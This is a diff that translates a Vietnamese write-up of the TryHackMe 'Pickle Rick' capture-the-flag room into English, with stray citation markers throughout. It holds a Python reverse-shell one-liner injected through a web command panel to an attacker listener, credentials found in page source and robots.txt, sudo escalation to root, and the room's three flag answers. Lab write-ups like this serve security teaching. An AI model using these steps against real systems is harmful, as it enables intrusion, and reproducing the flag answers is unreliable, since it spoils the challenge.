@@ -1,95 +1,94 @@
-https://tryhackme.com/room/picklerick
 TRYHACKME WRITE-UP: PICKLE RICK
 ============================================================
 
-BƯỚC 1: RECONNAISSANCE (THU THẬP THÔNG TIN)
+STEP 1: RECONNAISSANCE
 ------------------------------------------------------------
-1. Kiểm tra Source Code:
-   - Tại trang chủ, tôi kiểm tra mã nguồn (View Source).
-   - Phát hiện một ghi chú trong thẻ comment HTML.
-   - [cite_start]Thông tin thu được: Username là "R1ckRul3s"[cite: 5].
+1. Checking Source Code:
+   - On the homepage, I inspected the page source code.
+   - [cite_start]I discovered a note hidden within an HTML comment[cite: 5].
+   - [cite_start]Extracted Information: Username is "R1ckRul3s"[cite: 5].
 
-2. Quét đường dẫn ẩn (Directory Busting):
-   - Sử dụng công cụ Dirsearch để quét các thư mục và file trên server.
-   - Lệnh sử dụng:
-     [cite_start]dirsearch -u http://10.49.160.65/ [cite: 7]
+2. Directory Busting:
+   - [cite_start]I used Dirsearch to scan for hidden directories and files on the server[cite: 6].
+   - Command used:
+     dirsearch -u http://10.49.160.65/
    
-   - [cite_start]Kết quả quan trọng tìm thấy[cite: 8, 9]:
+   - [cite_start]Key results found[cite: 8]:
      /assets/
      /login.php
      /robots.txt
 
-3. Kiểm tra robots.txt:
-   - Truy cập http://10.49.160.65/robots.txt
-   - [cite_start]Nội dung tìm thấy: "Wubbalubbadubdub"[cite: 9].
-   -> Suy luận: Đây có thể là mật khẩu.
+3. Checking robots.txt:
+   - I accessed http://10.49.160.65/robots.txt.
+   - [cite_start]Content found: "Wubbalubbadubdub"[cite: 9].
+   -> Inference: This string is likely the password.
 
 ------------------------------------------------------------
-BƯỚC 2: INITIAL ACCESS (TRUY CẬP HỆ THỐNG)
+STEP 2: INITIAL ACCESS
 ------------------------------------------------------------
-1. Đăng nhập:
-   - [cite_start]Truy cập trang /login.php[cite: 9].
+1. Logging In:
+   - [cite_start]Navigated to /login.php[cite: 9].
    - Username: R1ckRul3s
    - Password: Wubbalubbadubdub
-   -> Đăng nhập thành công, chuyển hướng đến trang "Command Panel".
+   -> Login successful. Redirected to the "Command Panel".
 
-2. Tạo Reverse Shell:
-   - Tại máy tấn công (Kali), mở cổng lắng nghe:
-     [cite_start]nc -lvnp 4444 [cite: 10]
+2. Creating a Reverse Shell:
+   - On the attacking machine (Kali), I started a listener:
+     nc -lvnp 4444
    
-   - Tại Command Panel trên web, chèn Payload Python để kết nối ngược về máy Kali:
-     [cite_start]python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.139.123",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' [cite: 10]
+   - [cite_start]On the web Command Panel, I injected a Python Payload to connect back to my machine[cite: 10]:
+     python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.139.123",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-   -> Kết quả: Nhận được kết nối, chiếm được quyền điều khiển user "www-data".
+   -> Result: Connection received. I gained access as user "www-data".
 
 ------------------------------------------------------------
-BƯỚC 3: TÌM KIẾM FLAGS (POST-EXPLOITATION)
+STEP 3: FINDING FLAGS (POST-EXPLOITATION)
 ------------------------------------------------------------
 1. Flag 1 (Ingredient 1):
-   - Liệt kê file tại thư mục hiện tại:
+   - Listed files in the current directory:
      ls
-   - Đọc nội dung file bí mật:
-     [cite_start]cat Sup3rS3cretPickl3Ingred.txt [cite: 10]
-   -> Kết quả: mr. meeseek hair
+   - [cite_start]Read the content of the secret file[cite: 10]:
+     cat Sup3rS3cretPickl3Ingred.txt
+   [cite_start]-> Result: mr. meeseek hair [cite: 10]
 
-   - Kiểm tra gợi ý tiếp theo:
-     [cite_start]cat clue.txt [cite: 10]
-     (Gợi ý: Tìm quanh hệ thống file để thấy nguyên liệu khác).
+   - Checked the clue file:
+     cat clue.txt
+     (Hint: "Look around the file system for the other ingredient.") [cite_start][cite: 10]
 
 2. Flag 2 (Ingredient 2):
-   - Di chuyển đến thư mục home của user Rick:
+   - [cite_start]Navigated to Rick's home directory[cite: 10]:
      cd /home
-     [cite_start]cd rick [cite: 10]
+     cd rick
    
-   - Liệt kê file thấy "second ingredients". Do tên file có dấu cách, cần dùng dấu ngoặc kép để đọc:
-     [cite_start]cat "second ingredients" [cite: 10]
-   -> Kết quả: 1 jerry tear
+   - Listed files and found "second ingredients". [cite_start]Since the filename contains a space, I used quotes to read it[cite: 11]:
+     cat "second ingredients"
+   [cite_start]-> Result: 1 jerry tear [cite: 11]
 
 ------------------------------------------------------------
-BƯỚC 4: PRIVILEGE ESCALATION (LEO THANG ĐẶC QUYỀN)
+STEP 4: PRIVILEGE ESCALATION
 ------------------------------------------------------------
-1. Kiểm tra quyền sudo:
-   - Chạy lệnh để xem user hiện tại được phép làm gì:
-     [cite_start]sudo -l [cite: 11]
+1. Checking Sudo Permissions:
+   - [cite_start]Ran the following command to check current user privileges[cite: 11]:
+     sudo -l
    
-   - Kết quả trả về:
+   - [cite_start]Output received[cite: 11]:
      (ALL) NOPASSWD: ALL
-   -> User www-data có thể chạy mọi lệnh với quyền root không cần mật khẩu.
+   -> User www-data can run any command as root without a password.
 
-2. Leo quyền Root và lấy Flag cuối:
-   - Chuyển sang shell root:
-     [cite_start]sudo bash -i [cite: 11]
+2. Escalating to Root and Getting the Final Flag:
+   - [cite_start]Switched to a root shell[cite: 11]:
+     sudo bash -i
    
-   - Di chuyển đến thư mục root và đọc flag:
+   - [cite_start]Navigated to the root directory and read the flag[cite: 11]:
      cd /root
      ls
-     [cite_start]cat 3rd.txt [cite: 11]
-   -> Kết quả: 3rd ingredients: fleeb juice
+     cat 3rd.txt
+   [cite_start]-> Result: 3rd ingredients: fleeb juice [cite: 11]
 
 ============================================================
-TỔNG KẾT
+SUMMARY
 ============================================================
-Đã tìm thấy đủ 3 nguyên liệu (Flags):
+All 3 ingredients (Flags) have been found:
 1. mr. meeseek hair
 2. 1 jerry tear
 3. fleeb juice
